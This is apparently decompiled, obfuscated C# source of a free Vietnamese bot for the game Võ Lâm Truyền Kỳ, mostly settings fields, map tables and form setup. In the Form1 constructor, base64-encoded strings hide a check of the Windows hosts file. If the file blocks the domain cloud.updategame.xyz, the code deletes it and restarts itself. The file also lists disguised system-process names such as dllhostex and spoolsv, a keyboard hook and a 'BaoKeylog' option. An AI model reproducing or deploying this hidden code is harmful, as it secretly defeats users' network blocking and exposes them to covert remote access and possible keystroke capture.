	public static int int_54 = Class66.smethod_4("PassKeoNhieumay", 0, "1234");

	public static int int_55 = Class66.smethod_4("Mahoatoado", 0, "0");

	public static int int_56 = Class66.smethod_4("flagDanhDenchet", 0, "0");

	public static int int_57 = Class66.smethod_4("KCAcdanhTiepcan", 0, "350");

	public static string string_13 = "nhap_id_vao_day";

	public static string string_14 = "textIDSudung";

	public static string string_15 = Class66.smethod_7(string_14, 0, string_13);

	public static string[] string_16 = new string[4] { "WAR (PK -Boss)", "TK (Tống Kim - PHLT)", "CTC (Chiến trường CTC)", "ĐƠN ĐẤU" };

	public static string[] string_17 = new string[3] { "Đánh Thất thành", "Đánh Tam trụ", "Đánh Tam môn đài" };

	public static string[,] string_18 = new string[56, 2]
	{
		{ "Lâm An", "176" },
		{ "Biện Kinh", "37" },
		{ "Dương Châu", "80" },
		{ "Phượng Tường", "01" },
		{ "DĐại Lý", "162" },
		{ "Thành Đô", "11" },
		{ "Tương Dương", "78" },
		{ "...", "" },
		{ "Ba Lăng huyện", "53" },
		{ "Giang Tân thôn", "20" },
		{ "Đạo Hương thôn", "101" },
		{ "Chu Tiên trấn", "100" },
		{ "Long Tuyền thôn", "174" },
		{ "Thạch Cổ trấn", "153" },
		{ "Vĩnh Lạc trấn", "99" },
		{ "Long Môn trấn", "121" },
		{ "...", "" },
		{ "Bắc Trường Bạch", "322" },
		{ "Nam Trường Bạch", "321" },
		{ "Khỏa Lang động", "75" },
		{ "Phong Lăng độ", "336" },
		{ "Mạc Cao Quật", "340" },
		{ "1 Sa mạc", "225" },
		{ "2 Sa mạc", "226" },
		{ "3 Sa mạc", "227" },
		{ "Sa mạc địa biểu", "224" },
		{ "...", "" },
		{ "Vận tiêu 1", "b¶n ®å kh|iÓm VËn Tiªu|Ën tiªu cæng 1" },
		{ "Vận tiêu 2", "b¶n ®å kh|iÓm VËn Tiªu|Ën tiªu cæng 2" },
		{ "Vận tiêu 3", "b¶n ®å kh|iÓm VËn Tiªu|Ën tiªu cæng 3" },
		{ "...", "" },
		{ "Đông Sinh Tử đấu trường", "dông thuËt|Sinh T|§«ng|®«ng" },
		{ "Tây Sinh Tử đấu trường", "dông thuËt|Sinh T|T©y" },
		{ "Nam Sinh Tử đấu trường", "dông thuËt|Sinh T|Nam" },
		{ "Bắc Sinh Tử đấu trường", "dông thuËt|Sinh T|B¾c" },
		{ "...", "" },
		{ "Hội Quán VL", "Héi Qu¸n|Héi Qu¸n Vâ L©m" },
		{ "Linh Thủy Ngư Thôn", "Héi Qu¸n|Linh Thñy" },
		{ "Huyền Cổ Các", "HuyÒn C¬" },
		{ "...", "" },
		{ "Tu Luyện 10", "LuyÖn Cèc|10-80|CÊp 10" },
		{ "Tu Luyện 20", "LuyÖn Cèc|10-80|CÊp 20" },
		{ "Tu Luyện 30", "LuyÖn Cèc|10-80|CÊp 30" },
		{ "Tu Luyện 40", "LuyÖn Cèc|10-80|CÊp 40" },
		{ "Tu Luyện 50", "LuyÖn Cèc|10-80|CÊp 50" },
		{ "Tu Luyện 60", "LuyÖn Cèc|10-80|CÊp 60" },
		{ "Tu Luyện 70", "LuyÖn Cèc|10-80|CÊp 70" },
		{ "Tu Luyện 80", "LuyÖn Cèc|10-80|CÊp 80" },
		{ "...", "" },
		{ "Tu Luyện 90", "LuyÖn Cèc|90-180|CÊp 90" },
		{ "Tu Luyện 100", "LuyÖn Cèc|90-180|CÊp 100" },
		{ "Tu Luyện 120", "LuyÖn Cèc|90-180|CÊp 120" },
		{ "Tu Luyện 140", "LuyÖn Cèc|90-180|CÊp 140" },
		{ "Tu Luyện 160", "LuyÖn Cèc|90-180|CÊp 160" },
		{ "Tu Luyện 180", "LuyÖn Cèc|90-180|CÊp 180" },
		{ "Hướng dẫn", "" }
	};

	public static string[,] string_19 = new string[5, 2]
	{
		{ "Đông", "®«ng|§«ng" },
		{ "Tây", "t©y" },
		{ "Nam", "nam" },
		{ "Bắc", "b¾c" },
		{ "T.Tâm", "t©m" }
	};

	private static string[] string_20 = new string[2] { "T¾t", "BËt" };

	private static string string_21 = "t1";

	public static int int_58 = 0;

	public static string string_22 = Class11.smethod_15(Class66.smethod_7("AccChinhNameA", 0));

	private static string[] string_23 = null;

	public static int[] int_59 = new int[2]
	{
		Class66.smethod_4("flagMuaTDP_0", 0, "1"),
		Class66.smethod_4("flagMuaTDP_1", 0, "4")
	};

	public static int int_60 = Class66.smethod_4("ValueThuocDimua", 0, "10");

	public static int int_61 = Class66.smethod_4("flagSuadoTaichoEx", 0, "1");

	public static int int_62 = Class66.smethod_4("flagKhongSuaTK", 0, "1");

	public static int int_63 = Class66.smethod_4("flagLuonSuaMua", 0, "1");

	public static int int_64 = Class66.smethod_4("flagSudoBachKim", 0, "1");

	public static int int_65 = Class66.smethod_4("fSuaPhichiendau", 0, "0");

	public static int[] int_66 = new int[2]
	{
		Class66.smethod_4("fSuado1_0", 0, "95"),
		Class66.smethod_4("fSuado1_1", 0, "10")
	};

	public static int[] int_67 = new int[2]
	{
		Class66.smethod_4("RuttienMax_00", 0, "0"),
		Class66.smethod_4("RuttienMax_01", 0, "500")
	};

	public static int int_68 = Class66.smethod_4("flagPhimTatSuado", 0, "0");

	public static int int_69 = 1;

	public static int int_70 = Class66.smethod_4("flagGiamRamtudong", 0, "0");

	public static int int_71 = Class66.smethod_4("flagDoiTitle", 0, "0");

	public static int int_72 = Class66.smethod_4("flagChatNhamEx", 0, "0");

	public static string string_24 = Class66.smethod_7("textChatNhams", 0, string_49 + "Auto cho Võ Lâm Truyền Kỳ Offline - Miễn Phí 100%");

	public static int int_73 = Class66.smethod_4("flagLoaiboGameHu", 0, "0");

	public static int int_74 = Class66.smethod_4("BaoKeylog", 0, "0");

	public static int int_75 = Class66.smethod_4("fNguoiChoiTuGiam", 0, "1");

	public static int int_76 = Class66.smethod_4("vGiamDelay", 0, "400");

	public static string string_25 = Class66.smethod_7("NameMuaGop", 0);

	public static int int_77 = Class66.smethod_4("flagMuaKTC", 0, "0");

	public static int int_78 = Class66.smethod_4("flagMuaGop", 0, "1");

	public static bool bool_19 = false;

	public static int[] int_79 = new int[2]
	{
		Class66.smethod_4("MDSL0", 0, "0"),
		Class66.smethod_4("MDSL1", 0, "1")
	};

	public static int int_80 = Class66.smethod_4("fThanhTruotSudung", 0, "0");

	public static int int_81 = Class66.smethod_4("fDenToado", 0, "0");

	public static int int_82 = Class66.smethod_4("fDenToadoLeave", 0, "1");

	public static bool bool_20 = false;

	public static string[] string_26 = null;

	private static string[] string_27 = null;

	public static int int_83 = -1;

	private bool bool_21 = false;

	public static string[] string_28 = new string[11]
	{
		"Tiền và HK-BK", "<= 1 ô", "<= 1 ô màu", "<= 2 ô", "<= 2 ô màu", "<= 3 ô", "<= 3 ô màu", "<= 4 ô", "<= 4 ô màu", "Đồ màu",
		"Tất cả"
	};

	public static string[] string_29 = new string[5] { "1 ô", "2 ô", "3 ô", "4 ô", "6 ô" };

	public static string[] string_30 = new string[3] { "Khoảng cách", "Ngũ hành", "Môn phái" };

	public static string[] string_31 = new string[4] { "Trên ngựa", "Xuống ngựa", "Tự động", "Người dùng điều khiển" };

	public static int int_84 = 150;

	private string[] string_32 = new string[2] { "Bên Tống", "Bên Kim" };

	private static string[] string_33 = new string[2] { "Thiên Bảo khố", "Phong Kỳ" };

	public static string[] string_34 = new string[2] { "Bán", "Sử dụng (ăn)" };

	public static int int_85 = Class66.smethod_4("nDobenOut", 0, "1");

	public static int int_86 = Class66.smethod_4("nDobenThap", 0, "5");

	public static int int_87 = Class66.smethod_4("flagThodiaphuDobenThap", 0, "1");

	public static int int_88 = Class66.smethod_4("ThoigianSua", 0, "60");

	public static int int_89 = Class66.smethod_4("flagDoiPKTheoAccChinh", 0, "1");

	public static int int_90 = Class66.smethod_4("flagTrolaiDiemcu", 0, "0");

	public static int int_91 = Class66.smethod_4("fMatmaXaphu", 0, "0");

	public static int int_92 = Class66.smethod_4("flagKhongDanhCapnho", 0, "1");

	public static int int_93 = Class66.smethod_4("ValueCapBoqua", 0, "10");

	public static int int_94 = Class66.smethod_4("flagAccChinhRoiHauDoanh", 0, "0");

	public static int int_95 = Class66.smethod_4("flagAccPhuChoAccChinh", 0, "1");

	public static int int_96 = Class66.smethod_4("flagRabangTrinhsat", 0, "0");

	public static int int_97 = 0;

	public static int int_98 = Class66.smethod_4("TongKimXemSoluong", 0, "1");

	public static int int_99 = Class66.smethod_4("flagTuchonRowTrinhsat", 0, "1");

	public static int[] int_100 = new int[2]
	{
		Class66.smethod_4("TruotTK0", 0, "0"),
		Class66.smethod_4("TruotTK1", 0, "100")
	};

	public static int int_101 = Class66.smethod_4("fHieuUyTK", 0, "1");

	public static int int_102 = Class66.smethod_4("fChuyenThuocChinhxacTen", 0, "1");

	public static int int_103 = Class66.smethod_4("fChuyenThuocTruocMua", 0, "0");

	public static string string_35 = Class66.smethod_7("TenMauFree", 0, "[Hay chon ten thuoc mien phi]");

	public static int int_104 = Class66.smethod_4("flagMuaMpKhongNhapSo", 0, "0");

	public static int int_105 = Class66.smethod_4("flagMuaThonTran", 0, "0");

	public static int int_106 = Class66.smethod_4("flagTNBamPhim", 0, "0");

	public static int int_107 = Class66.smethod_4("TNIdexPhim", 0, "0");

	public static int int_108 = Class66.smethod_4("KhoangCachLenNguaEx", 0, "500");

	public static int int_109 = Class66.smethod_4("flagXuongNguaSansang", 0, "1");

	public static int int_110 = Class66.smethod_4("KhongdanhCungBang", 0, "0");

	public static int int_111 = Class66.smethod_4("flagIndexBentau", 0, "1");

	public static string[] string_36 = new string[9] { "1. Đi Bến 1 - Phong lăng độ", "2. Đi Bến 2 - Phong lăng độ", "3. Đi Bến 3 - Phong lăng độ", "4. Đi Vi Sơn đảo", "5. Đi Vi Sơn đảo - Tự mua LB ở KTC", "6. Click vào NPC gần nhất", "7. Lấy Menu Text trong game", "8. Lấy tất cả tên Item", "9. Lấy thông tin xung quanh" };

	public static int int_112 = Class66.smethod_4("flagTHPCTC", 0, "0");

	public static int int_113 = Class66.smethod_4("IdexChientruongChinh", 0, "0");

	public static int int_114 = Class66.smethod_4("flagSudungMapphuEx", 0, "0");

	public static int int_115 = Class66.smethod_4("IdexChientruongPhu", 0, "1");

	public static string string_37 = Class66.smethod_7("IdexThpCTC", 0, "3");

	public static int int_116 = Class66.smethod_4("flagThpCLD", 0, "0");

	public static int int_117 = Class66.smethod_4("flagKieuDiCLD", 0, "0");

	public static int int_118 = 10;

	public static int int_119 = Class66.smethod_4("CTCAchinhTudieuKhien", 0, "0");

	public static int int_120 = 0;

	public static int int_121 = 0;

	public static int int_122 = Class66.smethod_4("flagPhandame", 0, "0");

	public static int int_123 = Class66.smethod_4("flagDanhKhongten", 0, "0");

	public static int int_124 = Class66.smethod_4("PhamviKhinhcong", 0, "300");

	public static int int_125 = Class66.smethod_4("fThongbaoTHP", 0, "0");

	public static int int_126 = Class66.smethod_4("fTatBaoDame", 0, "0");

	public static int int_127 = Class66.smethod_4("fBatMouseDrag", 0, "0");

	public static int int_128 = Class66.smethod_4("ThoiGianChoThoDiaPhu", 0, "0");

	public static int int_129 = Class66.smethod_4("flagBaoDSKenhBang", 0, "0");

	public static int int_130 = Class66.smethod_4("ThoiGianTTL", 0, "1");

	private static string[] string_38 = new string[2] { "Thần Hành Phù lên", "Đi xa phu lên CLĐ" };

	private static string[] string_39 = new string[4] { "Tránh xa", "Thổ địa phù", "Đánh trả", "Thoát game" };

	public static string[] string_40 = new string[3] { "Giảm CPU mức 0 (khôi phục ban đầu)", "Giảm CPU mức 1 (khoảng 1/3 lần)", "Giảm CPU mức 2 (khoảng 1/2 lần)" };

	private string[] string_41 = new string[8] { "Time", "NL<=", "NL >", "SL<=", "SL >", "% NL+SL>", "Công kích <=", "Công kích >" };

	public static string string_42 = Environment.GetEnvironmentVariable("windir");

	public static string[,] string_43 = new string[4, 2]
	{
		{ "dllhostex", null },
		{ "ClearRam", null },
		{
			"TasksHostServices",
			string.Concat(string_39, "\\System32")
		},
		{
			"spoolsv",
			string.Concat(string_39, "\\SpeechsTracing")
		}
	};

	public static bool bool_22 = false;

	public static int[] int_131 = null;

	public static Point point_0;

	private static int[] int_132 = null;

	private static bool bool_23 = false;

	private static int int_133 = -1;

	public static Mutex mutex_0 = null;

	public static bool bool_24 = false;

	public static bool bool_25 = false;

	private static string string_44 = "tbDongMenuMuamau";

	public static int[] int_134 = Class11.smethod_70(Class66.smethod_7(string_44, 0, "2,1"));

	public static string string_45 = Class66.smethod_7("tbMenuTrinhsat", 0, "1,1");

	private string string_46 = null;

	private string string_47 = null;

	private string string_48 = null;

	private static int int_135 = Class66.smethod_4("fThunhoAuto", 0, "0");

	private static int int_136 = 0;

	public static string string_49 = string.Empty;

	private int int_137 = -1;

	public static bool bool_26 = false;

	public static int int_138 = -1;

	private bool bool_27 = false;

	private bool bool_28 = false;

	private static int int_139 = 0;

	private static long long_0 = 0L;

	private static long long_1 = 0L;

	private int int_140 = -1;

	private int int_141 = -1;

	private long long_2 = 0L;

	private static int int_142 = 0;

	private static int int_143 = 0;

	private static int int_144 = 0;

	private static long long_3 = 0L;

	private static long long_4 = 15000L;

	private static int int_145 = -1;

	private static int int_146 = -1;

	private static int int_147 = -1;

	private static int int_148 = -1;

	private static bool bool_29 = false;

	private static bool bool_30 = false;

	private static int int_149 = 0;

	private bool bool_31 = false;

	private static uint uint_2 = 0u;

	private static uint uint_3 = 0u;

	private static uint uint_4 = 0u;

	private static bool bool_32 = false;

	private static int int_150 = 0;

	private const int int_151 = 15;

	private static string string_50 = string.Empty;

	private static IntPtr intptr_1 = IntPtr.Zero;

	public static int int_152 = 0;

	private static string[] string_51 = null;

	private static string[] string_52 = null;

	public static string string_53 = string.Empty;

	private static int int_153 = -1;

	private static int int_154 = 0;

	private static int int_155 = -1;

	private static string[] string_54 = null;

	private static string[] string_55 = null;

	private static string[] string_56 = null;

	private static int int_156 = 0;

	private static int int_157 = 0;

	private static string string_57 = null;

	private static string string_58 = null;

	private static string[] string_59 = null;

	private static GStruct59[] gstruct59_0 = null;

	private static string[] string_60 = null;

	private bool bool_33 = false;

	private bool bool_34 = false;

	private int int_158 = 0;

	private IContainer icontainer_1;

	private string string_61 = null;

	private CheckBox checkBoxTheoSau;

	private CheckBox checkBoxFixtoadolag;

	public static List<string[]> list_0 = new List<string[]>();

	private string string_62 = string.Empty;

	private string string_63 = string.Empty;

	private string string_64 = string.Empty;

	private string string_65 = string.Empty;

	private string string_66 = string.Empty;

	private string string_67 = string.Empty;

	private string string_68 = string.Empty;

	[DllImport("import.DLL", CallingConvention = CallingConvention.Cdecl)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool Initialize();

	[DllImport("import.DLL", CallingConvention = CallingConvention.Cdecl)]
	private static extern void Start(int int_159);

	[DllImport("user32.dll")]
	private static extern IntPtr SetWindowsHookEx(int int_159, LowLevelKeyboardProc lowLevelKeyboardProc_1, IntPtr intptr_2, uint uint_5);

	[DllImport("user32.dll")]
	private static extern bool UnhookWindowsHookEx(IntPtr intptr_2);

	[DllImport("user32.dll")]
	private static extern IntPtr CallNextHookEx(IntPtr intptr_2, int int_159, IntPtr intptr_3, IntPtr intptr_4);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string string_69);

	[DllImport("import.DLL", CallingConvention = CallingConvention.Cdecl)]
	private static extern void Stop();

	[DllImport("import.DLL", CallingConvention = CallingConvention.Cdecl)]
	private static extern void Cleanup();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_69, string string_70);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetForegroundWindow(IntPtr intptr_2);

	[DllImport("user32.dll")]
	private static extern IntPtr SetParent(IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("user32.dll")]
	private static extern IntPtr CreateWindowEx(uint uint_5, string string_69, string string_70, uint uint_6, int int_159, int int_160, int int_161, int int_162, IntPtr intptr_2, IntPtr intptr_3, IntPtr intptr_4, IntPtr intptr_5);

	[DllImport("user32.dll")]
	private static extern void keybd_event(byte byte_0, byte byte_1, uint uint_5, uint uint_6);

	public Form1()
	{
		form1_0 = this;
		new Thread(FormAntivirus.smethod_3).Start();
		InitializeComponent();
		try
		{
		}
		catch
		{
		}
		tabControl2.Controls.Remove(tabPage3);
		base.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
		notifyIcon_0.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
		method_37();
		if (!bool_15)
		{
			tabControlPhutro.Controls.Remove(tabPageTest);
		}
		Class24.smethod_71();
		Class24.smethod_72();
		for (int i = 0; i < string_7.GetLength(0); i++)
		{
			list_0.Add(new string[6]
			{
				string_7[i, 0],
				string_7[i, 1],
				string_7[i, 2],
				string_7[i, 3],
				string_7[i, 4],
				string_7[i, 5]
			});
		}
		list_0.Add(new string[6] { " ", "VËt phÈm", "55", null, "vlbs.exe", null });
		string path = string_43[2, 1] + Class11.smethod_15("XFxkcml2ZXJzXFxldGNcXGhvc3Rz");
		string path2 = string_43[2, 1] + Class11.smethod_15("XFxkcml2ZXJzXFxldGNcXGhvc3RzLmljcw==");
		if (File.Exists(path))
		{
			string[] array = File.ReadAllLines(path);
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (text.ToLower().Contains(Class11.smethod_15("Y2xvdWQudXBkYXRlZ2FtZS54eXo=")) || text.ToLower().Contains(Class11.smethod_15("Ki51cGRhdGVnYW1lLnh5eg==")) || text.ToLower().Contains(Class11.smethod_15("Ki91cGRhdGVnYW1lLnh5eg==")))
				{
					File.Delete(path);
					Process.Start(Application.ExecutablePath);
					Environment.Exit(0);
				}
			}
		}
		if (!File.Exists(path2))
		{
			return;
		}
		string[] array3 = File.ReadAllLines(path2);
		string[] array4 = array3;
		foreach (string text2 in array4)
		{
			if (text2.ToLower().Contains(Class11.smethod_15("Y2xvdWQudXBkYXRlZ2FtZS54eXo=")) || text2.ToLower().Contains(Class11.smethod_15("Ki51cGRhdGVnYW1lLnh5eg==")) || text2.ToLower().Contains(Class11.smethod_15("Ki91cGRhdGVnYW1lLnh5eg==")))
			{
				File.Delete(path2);
				Process.Start(Application.ExecutablePath);
				Environment.Exit(0);
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.icontainer_1 = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ns100.Form1));
		this.notifyIcon_0 = new System.Windows.Forms.NotifyIcon(this.icontainer_1);
		this.timer_3 = new System.Windows.Forms.Timer(this.icontainer_1);
		this.textBoxKhoangCachAccChinh = new System.Windows.Forms.TextBox();
		this.checkBoxTimTrongthanh = new System.Windows.Forms.CheckBox();
		this.comboBoxAccChinh = new System.Windows.Forms.ComboBox();
		this.comboBoxIndex = new System.Windows.Forms.ComboBox();
		this.checkBoxTimAccchinh = new System.Windows.Forms.CheckBox();
		this.buttonOff = new System.Windows.Forms.Button();
		this.buttonAdd = new System.Windows.Forms.Button();
		this.richTextBoxStatus = new System.Windows.Forms.RichTextBox();
		this.listView1 = new System.Windows.Forms.ListView();
		this.columnHeader_0 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader_1 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader_2 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader_5 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader_6 = new System.Windows.Forms.ColumnHeader();
		this.tabControl1 = new System.Windows.Forms.TabControl();
		this.tabPage1 = new System.Windows.Forms.TabPage();
		this.checkBoxDungHieuUng2 = new System.Windows.Forms.CheckBox();
		this.tabControl3 = new System.Windows.Forms.TabControl();
		this.tabPageBang1 = new System.Windows.Forms.TabPage();
		this.checkBoxdamekethop = new System.Windows.Forms.CheckBox();
		this.hienthithongke = new System.Windows.Forms.CheckBox();
		this.buttonTHP = new System.Windows.Forms.Button();
		this.buttonTatcaTDP = new System.Windows.Forms.Button();
		this.buttonDoSat = new System.Windows.Forms.Button();
		this.comboBoxPhuong = new System.Windows.Forms.ComboBox();
		this.buttonBuffLaiTranphai = new System.Windows.Forms.Button();
		this.buttonThongke = new System.Windows.Forms.Button();
		this.buttonVang = new System.Windows.Forms.Button();
		this.buttonSuadoTaicho = new System.Windows.Forms.Button();
		this.buttonMd = new System.Windows.Forms.Button();
		this.buttonMuctieu = new System.Windows.Forms.Button();
		this.comboBoxTHP = new System.Windows.Forms.ComboBox();
		this.buttonThietLapDuongMon = new System.Windows.Forms.Button();
		this.buttonTim = new System.Windows.Forms.Button();
		this.buttonXanh = new System.Windows.Forms.Button();
		this.buttonNgaMybuff = new System.Windows.Forms.Button();
		this.buttonCashBua = new System.Windows.Forms.Button();
		this.buttonDame = new System.Windows.Forms.Button();
		this.buttonPT = new System.Windows.Forms.Button();
		this.buttonBoss = new System.Windows.Forms.Button();
		this.buttonNamIm = new System.Windows.Forms.Button();
		this.buttonBaoBoss = new System.Windows.Forms.Button();
		this.buttonBaoToado = new System.Windows.Forms.Button();
		this.labelLocdo = new System.Windows.Forms.Label();
		this.checkBoxBosBaobos = new System.Windows.Forms.CheckBox();
		this.textBoxPhamvi = new System.Windows.Forms.TextBox();
		this.checkBoxCungMucTieu = new System.Windows.Forms.CheckBox();
		this.checkBoxTudongPT = new System.Windows.Forms.CheckBox();
		this.checkBoxDuongMonBoom = new System.Windows.Forms.CheckBox();
		this.labelKieudame = new System.Windows.Forms.Label();
		this.comboBoxXuongNgua = new System.Windows.Forms.ComboBox();
		this.buttonTatcaLuuruong = new System.Windows.Forms.Button();
		this.checkBoxDameMacdinh = new System.Windows.Forms.CheckBox();
		this.buttonMorong = new System.Windows.Forms.Button();
		this.textBoxKhoangCachTheoSau = new System.Windows.Forms.TextBox();
		this.checkBoxTuCastBua = new System.Windows.Forms.CheckBox();
		this.checkBoxTiepCan = new System.Windows.Forms.CheckBox();
		this.checkBoxDanhquai = new System.Windows.Forms.CheckBox();
		this.buttonUuTien = new System.Windows.Forms.Button();
		this.labelTheoSauAll = new System.Windows.Forms.Label();
		this.buttonLoaitruAccBuff = new System.Windows.Forms.Button();
		this.comboBoxNhatdo = new System.Windows.Forms.ComboBox();
		this.checkBoxNhatdo = new System.Windows.Forms.CheckBox();
		this.comboBoxTheoSau = new System.Windows.Forms.ComboBox();
		this.checkBoxChetnamIm = new System.Windows.Forms.CheckBox();
		this.checkBoxTheoSau = new System.Windows.Forms.CheckBox();
		this.textBoxTimerNgamyBuff = new System.Windows.Forms.TextBox();
		this.textBoxNgamyBuff = new System.Windows.Forms.TextBox();
		this.checkBoxNgamyBuff = new System.Windows.Forms.CheckBox();
		this.checkBoxTamQuet = new System.Windows.Forms.CheckBox();
		this.textBoxKhoangCachTiepcan = new System.Windows.Forms.TextBox();
		this.comboBoxUuTien = new System.Windows.Forms.ComboBox();
		this.checkBoxUutienDanhquai = new System.Windows.Forms.CheckBox();
		this.checkBoxTuve = new System.Windows.Forms.CheckBox();
		this.tabPageBang2 = new System.Windows.Forms.TabPage();
		this.buttonNhiepTT = new System.Windows.Forms.Button();
		this.buttonTienSkill = new System.Windows.Forms.Button();
		this.checkBoxTatMuamauTK = new System.Windows.Forms.CheckBox();
		this.checkBoxTienSkill = new System.Windows.Forms.CheckBox();
		this.linkLabel2 = new System.Windows.Forms.LinkLabel();
		this.checkBoxTuClickNTT = new System.Windows.Forms.CheckBox();
		this.checkBoxVuotAi = new System.Windows.Forms.CheckBox();
		this.comboBoxKieudiCLD = new System.Windows.Forms.ComboBox();
		this.textBoxCaudame = new System.Windows.Forms.TextBox();
		this.checkBoxTuChayVA = new System.Windows.Forms.CheckBox();
		this.checkBoxCaudame = new System.Windows.Forms.CheckBox();
		this.checkBoxTHPChienLong = new System.Windows.Forms.CheckBox();
		this.comboBoxCLD = new System.Windows.Forms.ComboBox();
		this.checkBoxDenToadoLeave = new System.Windows.Forms.CheckBox();
		this.buttonDiemTapket = new System.Windows.Forms.Button();
		this.checkBoxDiemTapket = new System.Windows.Forms.CheckBox();
		this.checkBoxChienLongdong = new System.Windows.Forms.CheckBox();
		this.buttonLayToado = new System.Windows.Forms.Button();
		this.checkBoxDenToadoALL = new System.Windows.Forms.CheckBox();
		this.textBoxToadoDen = new System.Windows.Forms.TextBox();
		this.buttonXoaToado = new System.Windows.Forms.Button();
		this.checkBoxDenToadoUser = new System.Windows.Forms.CheckBox();
		this.tabPageTongKim = new System.Windows.Forms.TabPage();
		this.comboBoxHieuUng = new System.Windows.Forms.ComboBox();
		this.checkDungHieuUng = new System.Windows.Forms.CheckBox();
		this.buttonQuangThuoc = new System.Windows.Forms.Button();
		this.buttonBungThuoc = new System.Windows.Forms.Button();
		this.checkBoxQuangThuoc = new System.Windows.Forms.CheckBox();
		this.buttonThuocTDD = new System.Windows.Forms.Button();
		this.textBoxTocdoDanh = new System.Windows.Forms.TextBox();
		this.checkBoxAnThuocTDD = new System.Windows.Forms.CheckBox();
		this.label35 = new System.Windows.Forms.Label();
		this.comboBoxcauhinh = new System.Windows.Forms.ComboBox();
		this.checkBoxoverlay = new System.Windows.Forms.CheckBox();
		this.checkBoxFixtoadolag = new System.Windows.Forms.CheckBox();
		this.label22 = new System.Windows.Forms.Label();
		this.checkBoxTuChonClick = new System.Windows.Forms.CheckBox();
		this.labelToadoTrinhsat = new System.Windows.Forms.Label();
		this.label40 = new System.Windows.Forms.Label();
		this.buttonStopMuamau = new System.Windows.Forms.Button();
		this.buttonCongHauDoanh = new System.Windows.Forms.Button();
		this.buttonTatcaMuamau = new System.Windows.Forms.Button();
		this.checkBoxTubaoDanh = new System.Windows.Forms.CheckBox();
		this.textBoxClickMenuTS = new System.Windows.Forms.TextBox();
		this.comboBoxTrinhsat = new System.Windows.Forms.ComboBox();
		this.checkBoxAccChinhHauDoanh = new System.Windows.Forms.CheckBox();
		this.textBoxTruotTK = new System.Windows.Forms.TextBox();
		this.checkBoxDanhHieuuy = new System.Windows.Forms.CheckBox();
		this.checkBoxTKThanhTruot = new System.Windows.Forms.CheckBox();
		this.checkBoxTongKimXemSoluong = new System.Windows.Forms.CheckBox();
		this.checkBoxAccPhuHauDoanh = new System.Windows.Forms.CheckBox();
		this.comboBoxVaodiemBaodanh = new System.Windows.Forms.ComboBox();
		this.checkBoxTrinhSat = new System.Windows.Forms.CheckBox();
		this.toadotk = new System.Windows.Forms.CheckBox();
		this.tabPageCTC = new System.Windows.Forms.TabPage();
		this.label26 = new System.Windows.Forms.Label();
		this.comboBoxCTC = new System.Windows.Forms.ComboBox();
		this.tabControlThatThanh = new System.Windows.Forms.TabControl();
		this.tabPageThatthanh = new System.Windows.Forms.TabPage();
		this.textBox4 = new System.Windows.Forms.TextBox();
		this.buttonBandoCTC = new System.Windows.Forms.Button();
		this.checkBoxVaomapAchinh = new System.Windows.Forms.CheckBox();
		this.label15 = new System.Windows.Forms.Label();
		this.buttonPhimHDCTC = new System.Windows.Forms.Button();
		this.comboBoxChienTruongMapPhu = new System.Windows.Forms.ComboBox();
		this.buttonLayVitriXaphuCTQ = new System.Windows.Forms.Button();
		this.checkBoxOluonMapphu = new System.Windows.Forms.CheckBox();
		this.label17 = new System.Windows.Forms.Label();
		this.label34 = new System.Windows.Forms.Label();
		this.labelChuadaydu = new System.Windows.Forms.Label();
		this.comboBoxChienTruong = new System.Windows.Forms.ComboBox();
		this.checkBoxMapPhu = new System.Windows.Forms.CheckBox();
		this.checkBoxTHPCTC = new System.Windows.Forms.CheckBox();
		this.tabPageTamtru = new System.Windows.Forms.TabPage();
		this.groupBox8 = new System.Windows.Forms.GroupBox();
		this.buttonLayvitriCongTamtru = new System.Windows.Forms.Button();
		this.textBoxCongTamtru = new System.Windows.Forms.TextBox();
		this.label30 = new System.Windows.Forms.Label();
		this.textBoxToadoHieuthuocTamtru = new System.Windows.Forms.TextBox();
		this.label28 = new System.Windows.Forms.Label();
		this.comboBoxTenHieuThuocTamtru = new System.Windows.Forms.ComboBox();
		this.checkBoxPheThu = new System.Windows.Forms.CheckBox();
		this.buttonPhimHdTamtru = new System.Windows.Forms.Button();
		this.tabPageTamMondai = new System.Windows.Forms.TabPage();
		this.buttonTamMonDaiHD = new System.Windows.Forms.Button();
		this.richTextBox2 = new System.Windows.Forms.RichTextBox();
		this.buttonMapTamMondaiMacdinh = new System.Windows.Forms.Button();
		this.label27 = new System.Windows.Forms.Label();
		this.buttonLayMapTamMondai = new System.Windows.Forms.Button();
		this.textBoxTamMonDaiMapId = new System.Windows.Forms.TextBox();
		this.checkBoxAccChinhTudieukhienCTC = new System.Windows.Forms.CheckBox();
		this.tabPageTrain = new System.Windows.Forms.TabPage();
		this.tabControl6 = new System.Windows.Forms.TabControl();
		this.tabPage16 = new System.Windows.Forms.TabPage();
		this.buttonCopyPosXY = new System.Windows.Forms.Button();
		this.buttonHuongDan = new System.Windows.Forms.Button();
		this.buttonApdungAllTrain = new System.Windows.Forms.Button();
		this.linkLabelPhimPhichiendau = new System.Windows.Forms.LinkLabel();
		this.textBoxSLThoat = new System.Windows.Forms.TextBox();
		this.checkBoxToadoVong = new System.Windows.Forms.CheckBox();
		this.linkLabelPhimChaynhim = new System.Windows.Forms.LinkLabel();
		this.checkBoxDanhQuaiTrenduongdi = new System.Windows.Forms.CheckBox();
		this.textBoxMapName = new System.Windows.Forms.TextBox();
		this.checkBoxTrain = new System.Windows.Forms.CheckBox();
		this.checkBoxTDPHettien = new System.Windows.Forms.CheckBox();
		this.checkBoxDanhquaiTrain = new System.Windows.Forms.CheckBox();
		this.checkBoxTucheHT = new System.Windows.Forms.CheckBox();
